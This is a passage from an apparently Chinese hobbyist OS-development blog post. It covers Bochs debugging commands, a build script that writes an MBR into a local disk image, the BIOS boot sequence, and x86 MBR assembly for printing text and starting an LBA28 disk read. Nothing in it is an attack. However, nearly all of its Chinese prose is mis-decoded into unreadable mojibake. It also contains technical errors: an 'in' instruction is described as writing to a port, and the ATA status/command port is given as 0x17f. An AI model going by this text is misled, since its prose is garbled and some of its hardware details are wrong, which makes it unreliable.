ç§ä¸­æ–­ç±»å‹åŒ…æ‹¬â€œ softint â€ã€â€œ extint â€å’Œâ€œ iret â€ã€‚å¯ä»¥å•ç‹¬æ˜¾ç¤ºæŸç±»ä¸­æ–­ï¼Œå¦‚æ‰§è¡Œ <span class="hljs-keyword">show</span> softint åªæ˜¾ç¤ºè½¯ä»¶ä¸»åŠ¨è§¦å‘çš„ä¸­æ–­ï¼Œ <span class="hljs-keyword">show</span> extint åˆ™åªæ˜¾ç¤ºæ¥è‡ªå¤–éƒ¨è®¾å¤‡çš„ä¸­æ–­ï¼Œ <span class="hljs-keyword">show</span> iret åªæ˜¾ç¤º iretd æŒ‡ä»¤æœ‰å…³çš„ä¿¡æ¯ <br><br>regï¼šå¸¸ç”¨å¯„å­˜å™¨çš„å€¼<br><br><span class="hljs-keyword">info</span> gdt/ldt/CPU/idt/ivtï¼šå…¨å±€ç¬¦å·æè¿°è¡¨/å±€éƒ¨ç¬¦å·æè¿°è¡¨/æ‰€æœ‰CPUå¯„å­˜å™¨çš„å€¼/æ˜¾ç¤ºä¸­æ–­å‘é‡è¡¨IDT/æ˜¾ç¤ºä¸­æ–­å‘é‡è¡¨IVT<br><br>sregï¼šæŸ¥çœ‹æ®µå¯„å­˜å™¨çš„å€¼<br>dregï¼šæŸ¥çœ‹è°ƒè¯•å¯„å­˜å™¨çš„å€¼<br>cregï¼šæŸ¥çœ‹æ§åˆ¶å¯„å­˜å™¨çš„å€¼<br></code></pre></td></tr></table></figure><h3 id="pack-start"><a href="#pack-start" class="headerlink" title="pack &amp; start"></a>pack &amp; start</h3><p>pack.sh</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">!/bin/bash<br>nasm -o ./mbr.bin ./mbr.S<br>./bochs/bin/bximage <span class="hljs-attribute">-mode</span>=create <span class="hljs-attribute">-hd</span>=60M <span class="hljs-attribute">-imgmode</span>=<span class="hljs-string">&quot;flat&quot;</span> -q ./img.img<br>dd <span class="hljs-attribute">if</span>=./mbr.bin <span class="hljs-attribute">of</span>=./img.img <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>./bochs/bin/bochs -f ./bochsrc.disk<br></code></pre></td></tr></table></figure><h1 id="0x1-å¼€å§‹è°ƒæ•™MBRï¼ˆbushiï¼‰ğŸ¥µ"><a href="#0x1-å¼€å§‹è°ƒæ•™MBRï¼ˆbushiï¼‰ğŸ¥µ" class="headerlink" title="0x1:å¼€å§‹è°ƒæ•™MBRï¼ˆbushiï¼‰ğŸ¥µ"></a>0x1:å¼€å§‹è°ƒæ•™MBRï¼ˆbushiï¼‰ğŸ¥µ</h1><h2 id="about-BIOS"><a href="#about-BIOS" class="headerlink" title="about BIOS"></a>about BIOS</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå½“ä½ æŒ‰ä¸‹ç¥åœ£çš„å¼€æœºé”®ï¼Œ<code>CPU</code>é€šä¸Šç”µä¹‹åä»¥å®æ¨¡å¼å¯åŠ¨ï¼Œç¬¬ä¸€ä¸ªè¿è¡Œçš„ç¨‹åºä¾¿æ˜¯<code>BIOS</code>ï¼Œ<code>BIOS</code>å°†<code>MBR</code>è½½å…¥ï¼Œå°†æ§åˆ¶æƒäº¤ç»™äº†<code>MBR</code></p><p>äºæ˜¯ä¾¿äº§ç”Ÿäº†ç„å­¦ä¸‰é—®ï¼š<code>BIOS</code>æ˜¯ä»€ä¹ˆï¼Ÿä»–ä»å“ªæ¥ï¼Ÿä¸ºä»€ä¹ˆä»–å…ˆæ‰§è¡Œï¼Ÿ</p><p>é¦–å…ˆå…ˆçœ‹å¼ ã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹é‡Œçš„å›¾ï¼Œå…³äºå®æ¨¡å¼ä¸‹çš„å†…å­˜åˆ†å¸ƒ</p><p><img src="/img/OS/0.png" alt="img"></p><p><code>BIOS</code>ï¼š<code>Basic Input &amp; Output System</code>å³åŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿï¼Œä¸»è¦å·¥ä½œä¾¿æ˜¯æ£€æµ‹ã€åˆå§‹åŒ–ç¡¬ä»¶ï¼Œè¿˜å»ºç«‹äº†ä¼Ÿå¤§çš„ä¸­æ–­å‘é‡è¡¨</p><p>ä½†æ˜¯é€šè¿‡å›¾å¯çŸ¥ï¼Œ<code>BIOS</code>æ‰<code>0xf0000-0xfffff</code>å…±è®¡<code>64KB</code>å¤§å°ï¼Œä¸å¯èƒ½å…¼é¡¾åˆ°æ‰€æœ‰çš„ç¡¬ä»¶è®¾å¤‡ï¼Œè€Œä¸”æ­¤æ—¶è¿è¡Œåœ¨å®æ¨¡å¼ä¸‹ï¼Œä¹Ÿæ²¡æœ‰è¿™ä¸ªå¿…è¦ï¼Œæ‰€ä»¥åªè¦æŒ‘ä¸€äº›é‡è¦çš„ï¼Œèƒ½ä¿è¯è®¡ç®—æœºè¿è¡Œçš„åŸºæœ¬ç¡¬ä»¶IOæ“ä½œå°±è¡Œäº†ã€‚æ­¤ä¸º<code>BIOS</code>åç§°ç”±æ¥</p><p>è‡³äº<code>BIOS</code>åœ¨å“ªé‡Œï¼Œè¿™ç©æ„ä¸€ç›´åœ¨ä¸»æ¿ä¸Šçš„<code>ROM</code>é‡Œï¼Œé€šç”µçš„æ—¶å€™<code>ROM</code>å°±è¢«æ˜ å°„åœ¨<code>0xf0000-0xfffff</code>,åªè¦è®¿é—®äº†è¿™é‡Œå°±ç®—è®¿é—®äº†<code>BIOS</code>,è¿™ä¸ªæ˜ å°„å®Œå…¨æ˜¯ç”±ç¡¬ä»¶å®Œæˆçš„ã€‚</p><p>But <code>BIOS</code>ä¹Ÿç®—æ˜¯ä¸ªç¨‹åºï¼Œæ‰€ä»¥ä¹Ÿæ˜¯æœ‰å…¥å£çš„ï¼Œæ­¤å¤„ä¾¿æ˜¯<code>0xffff0</code>ã€‚ç”µè„‘å¼€æœºçš„ä¸€ç¬é—´ï¼ŒCPUçš„<code>cs:ip</code>å¯„å­˜å™¨è¢«èµ‹å€¼ä¸º<code>0xf000</code>:<code>0xfff0</code>ã€‚ç„¶åå¼€æœºæ—¶å¤„äºå®æ¨¡å¼ï¼Œæ®µåŸºå€<code>cs</code>è¦å·¦ç§»å››ä½ï¼Œæ‰€ä»¥æ­¤æ—¶<code>cs:ip</code>ç­‰æ•ˆåœ°å€ä¸º<code>0xffff0</code>ï¼Œä¸º<code>BIOS</code>å…¥å£ã€‚</p><p>ä½†æ˜¯<code>0xffff0-0xfffff</code>è¿™çŸ­çŸ­çš„16å­—èŠ‚æ˜¾ç„¶å¹¶ä¸èƒ½å¹²ä»€ä¹ˆï¼Œé€šè¿‡è°ƒè¯•å‘ç°ï¼Œ<code>0xffff0</code>å¤„çš„æŒ‡ä»¤å®ä¸ºè·³è½¬æŒ‡ä»¤ï¼Œè·³åˆ°<code>0xfe05b</code>å¤„ã€‚è¿™æ‰æ˜¯<code>BIOS</code>çœŸæ­£å¼€å§‹çš„åœ°æ–¹</p><p><img src="/img/OS/1.png" alt="img"></p><p>å½“åˆå§‹åŒ–ç¡¬ä»¶å’Œå»ºç«‹ä¸­æ–­å‘é‡è¡¨åï¼Œ<code>BIOS</code>å°†è‡ªå·±æœ€åçš„æ³¢çº¹ç”¨äºæ£€æŸ¥0ç›˜0é“1æ‰‡åŒºï¼ˆå®åˆ™æ˜¯0ç›˜0é“0æ‰‡åŒºï¼ŒCHSè¡¨ç¤ºæ–¹å¼ä¸­1æ‰‡åŒºå°±æ˜¯ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼‰æœ€åä¸¤ä¸ªå­—èŠ‚æ˜¯å¦ä¸º<code>magic number</code> <strong>0x55</strong>å’Œ<strong>0xaa</strong>ï¼ˆä½ é—®ğŸ‘´ä¸ºä»€ä¹ˆä¸æ˜¯114514è¿™ç§æ¶è‡­çš„æ‚ä¿®~ï¼ŒğŸ‘´çŸ¥é“ä¸ªderï¼Œåæ­£ä¹¦é‡Œå†™äº†ï¼‰ã€‚å¦‚æœæ˜¯ï¼Œå°±ä¼šæŠŠè¿™ä¸ªæ‰‡åŒºçš„<code>data</code>åŠ è½½åˆ°<code>0x7c00</code>,éšåè·³è½¬æ‰§è¡Œã€‚æ­¤å¤„æ‰§è¡Œçš„ï¼Œä¾¿æ˜¯MBRã€‚å¦‚æœä½ é—®å®Œ<code>magic number</code>åˆè¦é—®ğŸ‘´ä¸ºä»€ä¹ˆæ˜¯<code>0x7c00</code>,ğŸ‘´åªèƒ½è¯´æ˜¯<code>IBMç”Ÿäº§çš„PC5150çš„ROM BIOS ä¸­çš„INT19H</code>çš„å†å²é—ç•™é—®é¢˜ï¼Œå½“æ—¶çš„<code>BIOS</code>æŒ‰<code>32KB</code>çš„å¤§å°æ¥è®¾è®¡ï¼Œ<code>32KB</code>å°±æ˜¯<code>0x8000</code>ï¼Œ<code>MBR</code>çš„å¤§å°æ˜¯512å­—èŠ‚ï¼ŒåŒæ—¶ä½œä¸ºä¸€ä¸ªç¨‹åºéœ€è¦ä½¿ç”¨æ ˆï¼Œå§‘ä¸”ç®—<code>1KB</code>å¥½äº†ã€‚<code>1KB</code>æ˜¯å¤šå°‘ï¼Œ<code>0x400</code>ï¼Œæ‰€ä»¥<code>0x8000</code> - <code>0x400</code>æ˜¯<code>0x7c00</code>ã€‚</p><h2 id="MBRã®åˆæ¬¡è°ƒæ•™"><a href="#MBRã®åˆæ¬¡è°ƒæ•™" class="headerlink" title="MBRã®åˆæ¬¡è°ƒæ•™"></a>MBRã®åˆæ¬¡è°ƒæ•™</h2><p>å†™äº†è¿™ä¹ˆå¤šç»ˆäºåˆ°<code>MBR</code>äº†ï¼Œå¦ˆå¦ˆç”Ÿçš„</p><p><code>MBRï¼ˆMaster Boot Recodeï¼‰</code>â€”â€”ä¸»å¼•å¯¼è®°å½•ï¼Œæ˜¯æˆ‘ä»¬èƒ½æœ€æ—©æ”¯é…çš„ç¨‹åºï¼Œå› ä¸º<code>BIOS</code>è¿™bydæ˜¯å†™æ­»çš„ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒMBRçš„å¤§å°å¿…é¡»æ˜¯512å­—èŠ‚ï¼Œå› ä¸ºåªæœ‰è¿™æ ·æ‰èƒ½ä¿è¯0é“0ç›˜1æ‰‡åŒºçš„æœ€åä¸¤ä¸ªå­—èŠ‚ä¸º<code>magic</code>ã€‚</p><p>å…ˆå†™ä¸€ä¸ªåœ¨å±å¹•ä¸Šè¾“å‡ºå­—ç¬¦çš„<code>MBR</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00    ;å› ä¸ºMBRè¢«åŠ è½½åˆ°0x7c00ï¼Œæ‰€ä»¥å°†æ•´ä¸ªcodeä½œä¸ºsectionï¼Œå¹¶å°†vstartèµ‹å€¼0x7c00ï¼Œè¿™æ ·è®¡ç®—ç»å¯¹åœ°å€æ—¶å°±ä¼šä»¥0x7c00ä¸ºbase<br>mov ax,cs                ;æ®µå¯„å­˜å™¨ä¸èƒ½ç”¨ç«‹å³æ•°ï¼Œåªèƒ½é€šè¿‡å¯„å­˜å™¨æˆ–è€…å†…å­˜è¿›è¡Œèµ‹å€¼<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br><br>mov ax,0x600             ;ä¸Šå·å…¨éƒ¨è¡Œï¼Œæ¸…å±<br>mov bx,0x700<br>mov cx,0                 ;å·¦ä¸Šè§’ï¼ˆ0ï¼Œ0ï¼‰<br>mov dx,0x184f          ;å³ä¸‹è§’ï¼ˆ80ï¼Œ25ï¼‰<br>int 0x10                 ;BIOSæä¾›çš„0x10ä¸­æ–­<br><br> mov ah,3                 ;è·å–å…‰æ ‡ä½ç½®<br>mov bh,0<br>int 0x10<br><br>mov ax,message           ;es:bpæ˜¯å­—ç¬¦ä¸²åœ°å€ï¼Œå› ä¸ºå‰é¢eså·²ç»è¢«åˆå§‹åŒ–ï¼Œæ‰€ä»¥cs=es<br>mov bp,ax<br><br>mov cx,0x20              ;length <br>mov ax,0x1301            ;ah:01 æ˜¾ç¤ºå­—ç¬¦ä¸²ï¼Œå…‰æ ‡è·Ÿéšç§»åŠ¨<br>mov bx,0x2               ;bl:02 é»‘åº•ç»¿å­—<br>int 0x10 <br><br>jmp $                    ;$è¡¨ç¤ºå½“å‰è¡Œï¼Œç¨‹åºåœ¨è¿™è¾¹å¡ä½<br><br>message db &quot;The First MBR of Korey0sh1&quot;<br> times 510-($-$$) db 0    ;$$è¡¨ç¤ºsectionçš„ä½ç½®ï¼Œå¡«å……510çš„lengthï¼Œè¡¥ä¸Šmagic number<br>db 0x55,0xaa   <br></code></pre></td></tr></table></figure><p>è¿è¡Œåå¯ä»¥åº·åº·</p><p><img src="/img/OS/2.png" alt="img"></p><p>è¾“å‡ºçš„æ—¶å€™å†™äº†ä¸ªå¾ªç¯ï¼Œä¼˜åŒ–ä¸€ä¸‹ï¼Œä¸ç”¨ç®—lengthäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov ax,message<br>mov bp,ax<br><br>.korey_print:<br><br> mov ah,3<br>mov bh,0<br>int 0x10<br><br>mov cx,1<br>mov ax,0x1301<br>mov bx,0x2<br>int 0x10<br>        <br>    inc bp<br>    mov ax,[bp]<br>    test ax,ax<br>    jnz .korey_print<br>       <br>jmp $<br><br>message db &quot;The First MBR of Korey0sh1&quot;<br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><h2 id="å˜æˆæ˜¾å­˜å½¢çŠ¶çš„MBR"><a href="#å˜æˆæ˜¾å­˜å½¢çŠ¶çš„MBR" class="headerlink" title="å˜æˆæ˜¾å­˜å½¢çŠ¶çš„MBR"></a>å˜æˆæ˜¾å­˜å½¢çŠ¶çš„MBR</h2><p>å‰é¢çš„<code>MBR</code>ï¼Œä½¿ç”¨<code>BIOS</code>æä¾›çš„0x10ä¸­æ–­å®Œæˆäº†å­—ç¬¦è¾“å‡ºï¼Œè¯´å®è¯è¿˜æ˜¯ä¾èµ–äºä¸­æ–­å‘é‡è¡¨ã€‚</p><p>Butï¼Œä¸­æ–­å‘é‡è¡¨åªå­˜åœ¨äºå®æ¨¡å¼ï¼Œä»¥åè¿˜æ˜¯è¦è¿›å…¥ä¿æŠ¤æ¨¡å¼çš„æï¼Œä½†ä¿æŠ¤æ¨¡å¼å°±è«å¾—ä¸­æ–­å‘é‡è¡¨äº†ï¼Œä¹Ÿå°±æ— æ³•ä½¿ç”¨int 0x10æ¥å®Œæˆè¾“å‡ºäº†ã€‚</p><p>é‚£è¯¥æ€ä¹ˆåŠæ</p><p>ç­”æ¡ˆå°±æ˜¯ç›´æ¥å¯¹æ˜¾å¡ä¸Šæ‰‹ã€‚</p><p>æ˜¾å¡æ˜¾å¡ï¼Œå°±æ˜¯ç”¨æ¥å›¾åƒè¾“å‡ºçš„å¡ã€‚è€Œæ˜¾å¡ä¸­çš„æ˜¾å­˜ï¼Œæ˜¯æ˜¾å¡æä¾›ç»™æˆ‘ä»¬çš„æ¥å£ã€‚å…³äºå®æ¨¡å¼çš„å†…å­˜åˆ†å¸ƒä¸­æåˆ°<code>0xA0000</code>-<code>0xC7FFF</code>æ˜¯æ˜¾å­˜çš„åŒºåŸŸï¼Œäº‹å®ä¸Šï¼Œå½“ä½ ç›´æ¥åœ¨æ˜¾å­˜ä¸Šå†™ä¸œè¥¿ã€‚æ˜¾å¡ä¾¿ä¼šåœ¨å±å¹•ä¸Šè¾“å‡ºå†…å®¹</p><p><img src="/img/OS/3.png" alt="img"></p><p>ä¸‹é¢æ˜¯åœ¨æ˜¾å­˜æ–‡æœ¬æ¨¡å¼åŒºåŸŸï¼ˆä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºè¾“å‡ºå­—ç¬¦ï¼Œä¸€ä¸ªå­—ç¬¦è¡¨ç¤ºå…¶å±æ€§ï¼‰è¾“å‡º<code>â€œkorey&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov byte [gs:0x00],&#x27;k&#x27;<br>mov byte [gs:0x01],0xa4   ;Aï¼šèƒŒæ™¯è‰²ç»¿è‰²   4ï¼šå‰æ™¯è‰²çº¢è‰²<br><br>mov byte [gs:0x02],&#x27;o&#x27;<br>mov byte [gs:0x03],0xa4<br><br>mov byte [gs:0x04],&#x27;r&#x27;<br>mov byte [gs:0x05],0xa4<br><br>mov byte [gs:0x06],&#x27;e&#x27;<br>mov byte [gs:0x07],0xa4<br><br>mov byte [gs:0x08],&#x27;y&#x27;<br>mov byte [gs:0x09],0xa4<br><br>jmp $<br><br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><p><img src="/img/OS/4.png" alt="img"></p><h2 id="MBR-å’Œæˆ‘äº¤å¾€å§ï¼Œç£ç›˜ä»™è´ï¼ğŸ˜‹"><a href="#MBR-å’Œæˆ‘äº¤å¾€å§ï¼Œç£ç›˜ä»™è´ï¼ğŸ˜‹" class="headerlink" title="MBR:å’Œæˆ‘äº¤å¾€å§ï¼Œç£ç›˜ä»™è´ï¼ğŸ˜‹"></a>MBR:å’Œæˆ‘äº¤å¾€å§ï¼Œç£ç›˜ä»™è´ï¼ğŸ˜‹</h2><p><code>BIOS</code>åªèƒ½æŠŠ0æŸ±é¢0ç£é“1æ‰‡åŒº512å­—èŠ‚å¤§å°çš„<code>MBR</code>è½½å…¥å†…å­˜ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ<code>MBR</code>æ‰§è¡Œå®Œäº†ï¼Œç„¶åå¹²ä»€ä¹ˆå˜ã€‚</p><p>å…¶å®æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ<code>MBR</code>ä¹Ÿä¸è¿‡æ˜¯ä¸€ä¸ªä¸­ç»§ç¨‹åºè€Œå·²ï¼Œç„¶æ—¢ç„¶<code>MBR</code>æ˜¯ä»ç£ç›˜å¯¼å…¥çš„ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½ç”¨<code>MBR</code>ä»ç£ç›˜å¯¼å…¥åˆ«çš„<code>data</code>å‘¢ï¼Ÿ</p><p>è¿™å°±æ¶‰åŠåˆ°ç£ç›˜é€šä¿¡é—®é¢˜æƒ¹</p><p>å…ˆè´´ä¸€å¼ è¡¨ï¼Œå‡ºè‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</p><p><img src="/img/OS/5.png" alt="img"></p><p>å…ˆæ¥çœ‹çœ‹ä¸€äº›å¸¸ç”¨çš„ç«¯å£</p><ul><li>data <code>0x1f0/0x170</code>ï¼šè´Ÿè´£ç®¡ç†æ•°æ®ï¼Œå”¯ä¸€ä¸€ä¸ª16ä½çš„</li><li>error&#x2F;feature <code>0x1f1/0x171</code>ï¼šè¯»å–ç¡¬ç›˜å¤±è´¥æ—¶è®°å½•å¤±è´¥ä¿¡æ¯&#x2F;å†™å…¥ç¡¬ç›˜æ—¶å­˜å‚¨å‘½ä»¤éœ€è¦çš„é¢å¤–å‚æ•°</li><li>Sector count <code>0x1f2/0x172</code>ï¼šæŒ‡å®šå¾…å†™å…¥æˆ–å¾…è¯»å–çš„æ‰‡åŒº</li><li>device <code>0x1f6/0x176</code>ï¼šæ‚é¡¹å¯„å­˜å™¨ï¼Œä»€ä¹ˆåŠŸèƒ½éƒ½å¸¦ç‚¹ã€‚å›¾æ¥è‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</li><li><img src="/img/OS/6.png" alt="img"></li><li>status ï¼ˆè¯»ç¡¬ç›˜æ—¶ï¼‰<code>0x17f/0x177</code>ï¼šçŠ¶æ€å¯„å­˜å™¨ã€‚å›¾æ¥è‡ªã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹</li><li><img src="/img/OS/7.png" alt="img"></li><li>commandï¼ˆå†™ç¡¬ç›˜æ—¶ï¼‰<code>0x17f/0x177</code>ï¼šå‚¨å­˜è®©ç¡¬ç›˜æ‰§è¡Œçš„å‘½ä»¤ã€‚å¸¸ç”¨çš„å°±ä¸‰ä¸ª</li><li>identify: 0xEC ç¡¬ç›˜è¯†åˆ«<br>read sector: 0x20 è¯»å–æ‰‡åŒº<br>write sector: 0x30 å†™å…¥æ‰‡åŒº</li></ul><p>åœ¨ç‰©ç†å±‚é¢ä¸Šï¼Œç¡¬ç›˜å†…å¯»å€æ˜¯é€šè¿‡â€æŸ±é¢ï¼ç£å¤´ï¼æ‰‡åŒºâ€æ¥å®šä½çš„<code>Cylinder Head Sector</code>ï¼Œç®€ç§°ä¸º <code>CHS</code> ï¼Œè¿™å¯¹è¯»å†™çš„ç£å¤´å¾ˆå½¢è±¡ï¼Œä½†å¯¹äºå¯çˆ±çš„<code>MBR</code>å°å§å°±å¤ªæŠ½è±¡äº†ã€‚äºæ˜¯å‡ºç°äº†<code>LBA</code>ï¼Œé€»è¾‘å—åœ°å€<code>ï¼ˆlogic block addressï¼‰</code>ï¼Œä¸è€ƒè™‘æ‰‡åŒºæ‰€åœ¨çš„ç‰©ç†ç»“æ„ã€‚</p><p>LBAåˆåˆ†LBA28ï¼ˆæœ€å¤§æ”¯æŒ128Gï¼‰å’ŒLBA48ï¼ˆæœ€å¤§æ”¯æŒ128PBï¼‰ï¼Œæˆ‘ä»¬è¿™è¾¹å°±è®¨è®ºLBA28</p><p>æ‰€ä»¥ä¸‰ä¸ª8ä½çš„å¯„å­˜å™¨å­˜æ”¾<code>LBA28</code>çš„ä½24ä½ï¼Œé«˜4ä½å­˜æ”¾åœ¨<code>device</code>å¯„å­˜å™¨çš„ä½4ä½</p><p>åœ¨<code>x86</code>æ¶æ„ä¸­ï¼Œä¸<code>IO</code>è®¾å¤‡é€šä¿¡æ—¶ä¸€èˆ¬ä¼šç”¨<code>in/out</code>è¿™ä¸¤ä¸ªæŒ‡ä»¤ï¼Œä»ç«¯å£è¯»å‡ºæ•°æ®æˆ–è€…å‘ç«¯å£å†™å…¥æ•°æ®ã€‚å¹¶ä¸”é»˜è®¤<code>dx</code>å¯„å­˜å™¨å­˜å‚¨ç«¯å£å·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov dx,0x1f0<br>in dx,al         ;è¿™æ ·å°±æ˜¯å‘0x1f0ç«¯å£å†™å…¥alçš„å€¼äº†<br></code></pre></td></tr></table></figure><p>è‡³äºå¦‚ä½•ä»ç£ç›˜è¯»å…¥æ•°æ®å†™å…¥å†…å­˜çš„å¤§è‡´æ­¥éª¤ç¬”è€…å°±ä¸èµ˜è¿°äº†ï¼Œå¯ä»¥å‚è€ƒä¹¦ç±</p><p>ä¸‹é¢å°±æ˜¯ä»£ç ç½¢äº†</p><p>boot.inc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs assembly">LOADER_BASE_ADDR equ 0x900            ;0x500-0x7bfféƒ½æ˜¯å¯ç”¨åŒºåŸŸ<br>LOADER_START_SECTOR equ 0x2           ;æ‰‡åŒº2<br>%include &quot;boot.inc&quot;<br>SECTION MBR vstart=0x7c00<br>mov ax,cs                         ;initial<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600                      ;é€šè¿‡ä¸Šå·æ¸…ç©ºå±å¹•<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov eax,LOADER_START_SECTOR       ;eax = 2<br>mov bx,LOADER_BASE_ADDR           ;bx = 0x900<br>mov cx,1                          ;å¾…è¯»å–æ‰‡åŒºæ•° = 1<br>call rd_disk_m_16<br><br>jmp LOADER_BASE_ADDR<br><br>rd_disk_m_16:<br>mov esi,eax                       ;ä¿å­˜å‚æ•°<br>mov di,cx<br> <br>mov dx,0x1f2                      <br>mov al,cl         <br>out dx,al                         ;ä¼ ä¸ªsector count å¾…è¯»å–æ‰‡åŒºæ•°ä¸º1<br><br>mov eax,esi<br><br>mov dx,0x1f3<br>out dx,al                         ;LAB low<br><br>mov cl,8<br>shr eax,cl<br>mov dx,0x1f4<br>out dx,al                         ;LAB mid<br>    <br>    shr eax,cl                        <br>    mov dx,0x1f5<br>    out dx,al                         ;LAB high<br>    <br>shr eax,cl<br>and al,0x0f<br>or al,0xe0<br>mov dx,0x1f6<br>out dx,al                         